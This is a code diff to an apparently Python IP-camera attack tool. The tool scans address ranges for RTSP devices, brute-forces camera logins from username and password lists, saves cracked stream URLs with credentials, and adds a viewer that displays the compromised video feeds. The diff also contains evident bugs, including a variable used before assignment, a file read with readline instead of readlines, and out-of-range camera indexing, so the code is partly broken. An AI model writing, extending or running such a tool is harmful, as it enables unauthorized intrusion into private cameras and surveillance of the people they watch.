@@ -5,6 +5,7 @@ import base64
 import re
 import queue
 import time
+import cv2
 import sys
 from pathlib import Path
 
@@ -34,7 +35,7 @@ class main(object):
                             print(f"[ ip_ranges > {len(self.ip_ranges)} ]")
                         except Exception as e:
                             if "--debug" in sys.argv:
-                                print(e.with_traceback)
+                                print(e.with_traceback(e))
                             else:
                                 print(f"[ value must be list]")
                                 
@@ -44,7 +45,7 @@ class main(object):
                             print(f"[ port > {self.port} ]")
                         except Exception as e:
                             if "--debug" in sys.argv:
-                                print(e.with_traceback)
+                                print(e.with_traceback(e))
                             else:
                                 print(f"[ value must be num]")
                     case "scan_timeout":
@@ -53,7 +54,7 @@ class main(object):
                             print(f"[ scan_timeout > {self.scan_timeout} ]")
                         except Exception as e:
                             if "--debug" in sys.argv:
-                                print(e.with_traceback)
+                                print(e.with_traceback(e))
                             else:
                                 print(f"[ value must be num]")
                     case "password_list":
@@ -62,7 +63,7 @@ class main(object):
                             print(f"[ password_list > {self.password_list} ]")
                         except Exception as e:
                             if "--debug" in sys.argv:
-                                print(e.with_traceback)
+                                print(e.with_traceback(e))
                             else:
                                 print(f"[ value must be path]")
                     case "login_list":
@@ -71,16 +72,16 @@ class main(object):
                             print(f"[ login_list > {self.login_list} ]")
                         except Exception as e:
                             if "--debug" in sys.argv:
-                                print(e.with_traceback)
+                                print(e.with_traceback(e))
                             else:     
                                 print(f"[ value must be path]")
-                                
+                    
             if command[0] == "load_targets":
                 try:
                     self.load_targets(command[1])
                 except Exception as e:
                     if "--debug" in sys.argv:
-                        print(e.with_traceback)
+                        print(e.with_traceback(e))
                     else:  
                         print('[ print(f"[ value must be path]") ]')
             
@@ -91,9 +92,9 @@ class main(object):
                 print(f"password_list: {str(self.password_list)}", end="\n")
                 print(f"port: {str(self.port)}", end="\n")
                 print(f"scan_timeout: {str(self.scan_timeout)}", end="\n")
-            
+        
+        
             if command[0] == "run":
-                
                 if len(command) != 2:
                     print("[ run scan/brute ]")
                 else:        
@@ -102,7 +103,10 @@ class main(object):
                         print(f"[ Targets Found: {len(self.founded_targets)} ]")
                     if command[1] == "brute":
                         self.module_brute_run()
-                        
+            
+            if command[0] == "view":
+                RTSP_Viewer().run()            
+            
             if command[0] == "quit":
                 return 0
             
@@ -133,10 +137,6 @@ class main(object):
             url = RtspBrute("./IpCams_scan_result.txt", self.login_list, self.password_list, self.port ).run() 
             if url is not None:
                 self.brute_result.append(url)
-                
-            with open("IpCams_brute_result.txt", "w") as f:
-                for ip_cam in self.brute_result:
-                    f.write(f"{ip_cam}\n")
                 print("[ Result saved in IpCams_brute_result.txt ]")
                 
             print(f"[ Total - {len(self.brute_result)} ]")
@@ -248,14 +248,13 @@ class RtspBrute(object):
             data = s.recv(1024).decode()
             return data
 
-        except KeyboardInterrupt:
-            return
-        except (socket.timeout, TimeoutError):
-            return
-        except (socket.error, OSError):
+        except Exception:
             return
 
     def brute_force(self):
+        with open("IpCams_brute_result.txt", "r") as f:
+            file = f.readlines()
+            
         while not q.empty():
             target = q.get()
             # print(target)
@@ -266,27 +265,81 @@ class RtspBrute(object):
                     for username in self.usernamelist:
                         for password in self.passwordlist:
                             # print(password)
-                            if "WWW-Authenticate: Basic" in data:
-                                data = self.rtsp_request(
-                                    target, username, password)
-                                if data is not None:
-                                    if "200 OK" in data:
-                                        print("rtsp://{}/av1&user={}&password={}".format(target, username, password))
-                                        self.brute_result = str("rtsp://{}/av1&user={}&password={}".format(target, username, password))
-                                        pass
-                                    if "401 Unauthorized" in data:
-                                        time.sleep(1)
-                                        # print("401 Unauthorized")
-                                        continue
+                            if data is not None:
+                                if "WWW-Authenticate: Basic" in data:
+                                    data = self.rtsp_request(target, username, password)
+                                    if data is not None:
+                                        if "200 OK" in data:
+                                            if res not in file:
+                                                res = str("rtsp://{}/av1&user={}&password={}".format(target, username, password))
+                                                print(res)
+                                                self.brute_result = res
+                                                with open("IpCams_brute_result.txt", "a") as f:
+                                                    f.writelines(f"\n{res}")
+                                            pass
+                                        if "401 Unauthorized" in data:
+                                            time.sleep(1)
+                                            # print("401 Unauthorized")
+                                            continue
                         pass
                 elif "200 OK" in data:
-                    print(f"rtsp://{target}/av1")
-                    self.brute_result = f"rtsp://{target}/av1"
+                    
+                    res = str(f"rtsp://{target}/av1")
+                    if res not in file:
+                        print(res)
+                        self.brute_result = res
+                        with open("IpCams_brute_result.txt", "a") as f:
+                            f.writelines(f"\n{res}")
                 else:
                     pass
                     # print("Unkonwn problem from %s" % target)
                     # print(data)
-
             else:
                 pass
         pass
+    
+class RTSP_Viewer(object):
+    def __init__(self):
+        self.rtsp_list = self.get_rtsp_file()
+        self.running = True
+    def run(self):
+        list_len = len(self.rtsp_list)
+        camera_num = 0
+        while self.running:
+            try:
+                self.camera_capture(camera_num)
+            except Exception as e:
+                print(e.with_traceback(e))
+            command = str(input(f"cameras[now {camera_num}]>> ")).split(" ")
+            
+            if command[0] == "quit":
+                return 0
+            if command[0] == "next":
+                camera_num += 1
+            if command[0] == "back":
+                camera_num -= 1
+            if camera_num == -1:
+                camera_num = list_len
+                
+            if camera_num == list_len+1:
+                camera_num = 0
+            
+            
+            
+    def get_rtsp_file(self):
+        with open("./IpCams_brute_result.txt", "r") as f:
+            return f.readline()
+        
+    def camera_capture(self, num):
+        print(f"{num}/{len(self.rtsp_list)}")
+        video = cv2.VideoCapture(self.rtsp_list[num])
+        while True:
+            ret ,frame = video.read()
+            cv2.imshow("RTSP",frame)
+            k = cv2.waitKey(1)
+            if k == ord("q"):
+                print('exit')
+                break
+        video.release()
+        cv2.destroyAllWindows()
+        
